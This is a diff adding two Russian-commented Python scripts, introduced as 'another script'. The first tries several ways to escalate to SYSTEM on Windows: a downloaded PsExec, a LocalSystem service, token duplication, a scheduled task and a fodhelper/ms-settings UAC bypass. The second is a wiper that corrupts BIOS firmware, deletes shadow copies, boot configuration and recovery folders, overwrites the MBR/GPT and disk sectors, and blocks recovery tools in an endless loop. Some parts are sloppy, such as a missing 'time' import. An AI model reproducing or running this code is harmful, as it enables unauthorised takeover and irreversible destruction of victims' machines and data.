@@ -1,0 +1,373 @@
+вот еще скрипт import os
+import subprocess
+import ctypes
+import sys
+import win32api
+import win32con
+import win32security
+import win32process
+
+# 1. МЕТОД ЧЕРЕЗ PSEXEC (Самый надежный)
+def get_system_via_psexec():
+    try:
+        # Скачиваем PsExec из интернета (если нет)
+        if not os.path.exists("PsExec.exe"):
+            import urllib.request
+            urllib.request.urlretrieve("https://live.sysinternals.com/PsExec.exe", "PsExec.exe")
+        
+        # Запускаем себя от имени SYSTEM
+        subprocess.run(["PsExec.exe", "-i", "-s", sys.executable, os.path.abspath(__file__)], check=True)
+        sys.exit(0)
+    except:
+        pass
+
+# 2. МЕТОД ЧЕРЕЗ SERVICE CONTROL MANAGER
+def get_system_via_service():
+    try:
+        # Создаем службу, которая запустит наш процесс как SYSTEM
+        service_name = "SystemHelperService"
+        bin_path = f'{sys.executable} "{os.path.abspath(__file__)}"'
+        
+        # Создаем службу
+        subprocess.run([
+            "sc", "create", service_name, 
+            "binPath=", bin_path,
+            "type=", "own", 
+            "start=", "auto",
+            "obj=", "LocalSystem"
+        ], shell=True, check=True)
+        
+        # Запускаем службу
+        subprocess.run(["sc", "start", service_name], shell=True, check=True)
+        sys.exit(0)
+    except:
+        pass
+
+# 3. МЕТОД ЧЕРЕЗ TOKEN DUPLICATION
+def get_system_via_token():
+    try:
+        # Получаем дескриптор текущего процесса
+        process_token = win32security.OpenProcessToken(
+            win32api.GetCurrentProcess(),
+            win32con.TOKEN_ALL_ACCESS
+        )
+        
+        # Ищем процесс с SYSTEM привилегиями
+        processes = win32process.EnumProcesses()
+        for pid in processes:
+            try:
+                process_handle = win32api.OpenProcess(
+                    win32con.PROCESS_QUERY_INFORMATION, False, pid
+                )
+                token_handle = win32security.OpenProcessToken(
+                    process_handle, win32con.TOKEN_QUERY
+                )
+                
+                # Проверяем, является ли токен SYSTEM
+                token_user = win32security.GetTokenInformation(
+                    token_handle, win32security.TokenUser
+                )
+                if token_user[0] == win32security.LookupAccountName("", "SYSTEM")[0]:
+                    # Дублируем токен
+                    duplicated_token = win32security.DuplicateTokenEx(
+                        token_handle,
+                        win32con.MAXIMUM_ALLOWED,
+                        None,
+                        win32security.SecurityImpersonation,
+                        win32security.TokenPrimary
+                    )
+                    
+                    # Запускаем процесс с токеном SYSTEM
+                    startup_info = win32process.STARTUPINFO()
+                    process_info = win32process.CreateProcessAsUser(
+                        duplicated_token,
+                        None,
+                        f'{sys.executable} "{os.path.abspath(__file__)}"',
+                        None,
+                        None,
+                        False,
+                        0,
+                        None,
+                        None,
+                        startup_info
+                    )
+                    sys.exit(0)
+            except:
+                continue
+    except:
+        pass
+
+# 4. МЕТОД ЧЕРЕЗ SCHTASKS (Планировщик заданий)
+def get_system_via_schtasks():
+    try:
+        # Создаем задание в планировщике с правами SYSTEM
+        task_name = "SystemMaintenanceTask"
+        xml_template = f'''
+        <?xml version="1.0" encoding="UTF-16"?>
+        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+            <Principals>
+                <Principal id="Author">
+                    <UserId>S-1-5-18</UserId>
+                    <RunLevel>HighestAvailable</RunLevel>
+                </Principal>
+            </Principals>
+            <Actions Context="Author">
+                <Exec>
+                    <Command>{sys.executable}</Command>
+                    <Arguments>"{os.path.abspath(__file__)}"</Arguments>
+                </Exec>
+            </Actions>
+        </Task>
+        '''
+        
+        with open("task.xml", "w") as f:
+            f.write(xml_template)
+        
+        subprocess.run([
+            "schtasks", "/Create", "/TN", task_name, 
+            "/XML", "task.xml", "/F"
+        ], shell=True, check=True)
+        
+        subprocess.run(["schtasks", "/Run", "/TN", task_name], shell=True, check=True)
+        sys.exit(0)
+    except:
+        pass
+
+# 5. МЕТОД ЧЕРЕЗ DEBUG PRIVILEGES
+def enable_debug_privilege():
+    try:
+        # Включаем привилегию отладки
+        token = win32security.OpenProcessToken(
+            win32process.GetCurrentProcess(),
+            win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY
+        )
+        
+        privilege_id = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
+        win32security.AdjustTokenPrivileges(
+            token, False, 
+            [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)]
+        )
+        return True
+    except:
+        return False
+
+# 6. МЕТОД ЧЕРЕЗ UAC BYPASS (Если уже админ)
+def bypass_uac():
+    try:
+        # Используем техники обхода UAC
+        uac_methods = [
+            "computerdefaults.exe", "fodhelper.exe", "sdclt.exe",
+            "slui.exe", "wscript.exe", "msconfig.exe"
+        ]
+        
+        for method in uac_methods:
+            try:
+                subprocess.run([
+                    "reg", "add", 
+                    "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
+                    "/ve", "/d", f'"{sys.executable}" "{os.path.abspath(__file__)}"',
+                    "/f"
+                ], shell=True, check=True)
+                
+                subprocess.run([
+                    "reg", "add", 
+                    "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
+                    "/v", "DelegateExecute", "/f"
+                ], shell=True, check=True)
+                
+                subprocess.run([method], shell=True, check=True)
+                time.sleep(2)
+                break
+            except:
+                continue
+    except:
+        pass
+
+# ОСНОВНАЯ ФУНКЦИЯ ДЛЯ ПОЛУЧЕНИЯ СИСТЕМНЫХ ПРИВИЛЕГИЙ
+def acquire_system_privileges():
+    # Проверяем, уже ли мы SYSTEM
+    try:
+        if win32security.LookupAccountSid(None, win32security.GetTokenInformation(
+            win32security.OpenProcessToken(
+                win32process.GetCurrentProcess(),
+                win32con.TOKEN_QUERY
+            ),
+            win32security.TokenUser
+        )[0])[0] == "SYSTEM":
+            return True
+    except:
+        pass
+    
+    # Пытаемся получить привилегии через различные методы
+    methods = [
+        get_system_via_psexec,
+        get_system_via_service,
+        get_system_via_token,
+        get_system_via_schtasks,
+        bypass_uac
+    ]
+    
+    for method in methods:
+        try:
+            method()
+            time.sleep(3)
+        except:
+            continue
+    
+    # Включаем отладочные привилегии
+    enable_debug_privilege()
+    
+    # Финальная проверка
+    try:
+        return win32security.LookupAccountSid(None, win32security.GetTokenInformation(
+            win32security.OpenProcessToken(
+                win32process.GetCurrentProcess(),
+                win32con.TOKEN_QUERY
+            ),
+            win32security.TokenUser
+        )[0])[0] == "SYSTEM"
+    except:
+        return False
+
+# ЗАПУСКАЕМ ПОЛУЧЕНИЕ ПРИВИЛЕГИЙ
+if acquire_system_privileges():
+    print("[SUCCESS] Привилегии SYSTEM получены")
+else:
+    print("[WARNING] Не удалось получить SYSTEM привилегии")   import os
+import subprocess
+import threading
+import ctypes
+import sys
+import struct
+
+# 1. ПОВЫШЕНИЕ ПРИВИЛЕГИЙ ДО СИСТЕМНЫХ
+def get_system_priv():
+    if os.name == 'nt':
+        try:
+            # Попытка получить права TrustedInstaller
+            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
+            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
+        except:
+            pass
+
+# 2. ПОЛНОЕ УДАЛЕНИЕ BIOS/UEFI
+def destroy_bios():
+    # Метод 1: Использование flashrom для перезаписи прошивки случайными данными
+    if os.name != 'nt':  # Linux
+        try:
+            # Определяем программировщик (обычно internal)
+            subprocess.run(["flashrom", "--programmer", "internal", "-w", "<(dd if=/dev/urandom bs=1M count=16)", "-V"], shell=True, check=True)
+        except:
+            pass
+    else:  # Windows
+        # Метод 2: Использование утилит производителя материнских плат с неправильным образом
+        try:
+            # Попытка использовать инструмент прошивки (например, AFUWIN) с битым файлом
+            bios_tools = ["afuwin.exe", "afuwinx64.exe", "fpt.exe", "fptw64.exe"]
+            for tool in bios_tools:
+                if os.path.exists(tool):
+                    # Создаем поврежденный образ BIOS
+                    with open("corrupt_bios.bin", "wb") as f:
+                        f.write(os.urandom(16*1024*1024))  # 16MB случайных данных
+                    subprocess.run([tool, "corrupt_bios.bin", "/ALL", "/FORCE"], check=True)
+        except:
+            pass
+
+    # Метод 3: Прямая запись в порты (крайне опасно)
+    try:
+        if os.name != 'nt':
+            # Пытаемся получить доступ к портам ввода-вывода
+            subprocess.run(["echo", "1", ">", "/proc/sys/vm/drop_caches"], shell=True)
+            # Запись в CMOS память
+            for i in range(256):
+                subprocess.run(["outb", "0x70", str(i)], shell=True)
+                subprocess.run(["outb", "0x71", "0xFF"], shell=True)
+    except:
+        pass
+
+# 3. УНИЧТОЖЕНИЕ ВСЕХ ИНСТРУМЕНТОВ ВОССТАНОВЛЕНИЯ WINDOWS
+def destroy_recovery_tools():
+    if os.name == 'nt':
+        # Список критических путей для восстановления
+        recovery_paths = [
+            "$env:WINDIR\\System32\\Recovery",
+            "$env:WINDIR\\Boot",
+            "$env:WINDIR\\WinSxS",
+            "$env:SYSTEMDRIVE\\Recovery",
+            "$env:SYSTEMDRIVE\\System Volume Information"
+        ]
+        
+        for path in recovery_paths:
+            try:
+                # Полное удаление с обходом защиты
+                subprocess.run(f"takeown /f {path} /r /d y", shell=True, check=True)
+                subprocess.run(f"icacls {path} /grant administrators:F /t", shell=True, check=True)
+                subprocess.run(f"rd /s /q {path}", shell=True, check=True)
+            except:
+                continue
+
+        # Удаление BCD (конфигурации загрузки)
+        try:
+            subprocess.run("bcdedit /delete {current} /f", shell=True, check=True)
+            subprocess.run("bcdedit /delete {default} /f", shell=True, check=True)
+        except:
+            pass
+
+# 4. ОТКЛЮЧЕНИЕ ВСЕХ РЕЗЕРВНЫХ КОПИЙ И ТЕНЕВЫХ КОПИЙ
+def disable_backups():
+    if os.name == 'nt':
+        # Отключаем Volume Shadow Copy
+        subprocess.run("vssadmin delete shadows /all /quiet", shell=True, check=True)
+        subprocess.run("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\VSS\" /v Start /t REG_DWORD /d 4 /f", shell=True, check=True)
+        
+        # Удаляем все точки восстановления
+        subprocess.run("vssadmin list shadows | ForEach { vssadmin delete shadow /Shadow=$_.Split()[1] }", shell=True, check=True)
+
+# 5. УНИЧТОЖЕНИЕ BOOTLOADER
+def destroy_bootloader():
+    if os.name == 'nt':
+        # Перезаписываем MBR и GPT
+        try:
+            with open("\\\\.\\PhysicalDrive0", "rb+") as f:
+                # Стираем MBR
+                f.write(os.urandom(512))
+                # Стираем начало GPT
+                f.seek(0)
+                f.write(os.urandom(4096))
+        except:
+            pass
+    else:
+        # Для Linux стираем загрузочные сектора
+        subprocess.run(["dd", "if=/dev/urandom", "of=/dev/sda", "bs=512", "count=2048"], check=True)
+
+# 6. БЛОКИРОВКА ДОСТУПА К ИНСТРУМЕНТАМ ВОССТАНОВЛЕНИЯ
+def block_recovery_access():
+    if os.name == 'nt':
+        # Блокируем доступ к восстановительным инструментам
+        tools = [
+            "cmd.exe", "powershell.exe", "regedit.exe", "msconfig.exe",
+            "diskmgmt.msc", "compmgmt.msc", "taskmgr.exe"
+        ]
+        
+        for tool in tools:
+            tool_path = f"$env:WINDIR\\System32\\{tool}"
+            try:
+                subprocess.run(f"icacls {tool_path} /deny Everyone:(X,R,W)", shell=True, check=True)
+            except:
+                continue
+
+# ЗАПУСКАЕМ ВСЕ ФУНКЦИИ ОДНОВРЕМЕННО
+get_system_priv()
+
+threading.Thread(target=destroy_bios, daemon=True).start()
+threading.Thread(target=destroy_recovery_tools, daemon=True).start()
+threading.Thread(target=disable_backups, daemon=True).start()
+threading.Thread(target=destroy_bootloader, daemon=True).start()
+threading.Thread(target=block_recovery_access, daemon=True).start()
+
+# ФИНАЛЬНЫЙ ШАГ: БЕСКОНЕЧНАЯ ПЕТЛЯ ДЛЯ ПРЕДОТВРАЩЕНИЯ ВОССТАНОВЛЕНИЯ
+while True:
+    time.sleep(1)
+    # Постоянно проверяем и блокируем любые попытки восстановления
+    if os.name == 'nt':
+        subprocess.run("wmic process where \"name like '%restore%' or name like '%recovery%'\" delete", shell=True)
